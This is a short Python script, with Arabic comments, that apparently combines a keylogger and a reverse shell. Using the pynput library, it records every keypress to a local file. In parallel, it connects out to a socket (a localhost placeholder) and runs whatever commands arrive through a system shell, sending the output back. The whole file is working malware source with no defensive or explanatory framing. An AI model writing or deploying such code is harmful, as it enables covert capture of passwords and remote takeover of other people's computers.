import socket
import subprocess
import os
from pynput import keyboard

# تحديد مسار الحفظ
log_file_path = "C:\\path\\to\\your\\directory\\keylog.txt"  # استبدل هذا بالمسار الذي تريده

def execute_command(command):
    """تنفيذ الأمر وإرجاع الإخراج."""
    try:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        return output.stdout + output.stderr
    except Exception as e:
        return str(e)

def connect():
    s = socket.socket()
    s.connect(("127.0.0.1", 8080))  # استخدام localhost

    while True:
        command = s.recv(1024).decode()

        if command.lower() == "exit":
            break

        if command.startswith("cd "):
            try:
                os.chdir(command.strip("cd "))
                s.send(b"Changed directory")
            except FileNotFoundError as e:
                s.send(str(e).encode())
        elif command.lower() == "ls" or command.lower() == "dir":
            output = execute_command("dir" if os.name == "nt" else "ls")
            s.send(output.encode())
        else:
            output = execute_command(command)
            s.send(output.encode())

    s.close()

def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'Key {key.char} pressed\n')
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'Special key {key} pressed\n')

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

if __name__ == "__main__":
    # بدء تسجيل ضغطات المفاتيح في خيط منفصل
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    # بدء الاتصال
    connect()

    # الانتظار حتى ينتهي المستمع
    listener.join()